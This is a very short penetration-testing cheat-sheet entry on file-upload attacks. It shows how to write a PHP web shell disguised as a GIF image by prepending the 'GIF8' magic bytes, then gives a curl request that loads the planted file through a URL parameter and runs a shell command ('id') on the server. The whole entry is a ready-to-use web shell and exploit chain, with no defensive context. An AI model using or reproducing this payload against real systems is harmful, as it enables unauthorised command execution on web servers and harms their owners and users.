# FileUpload

# GIF8 is for magic bytes
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

curl --user-agent "PENTEST" "$URL/?parameter=/path/to/image/shell.gif&cmd=id"
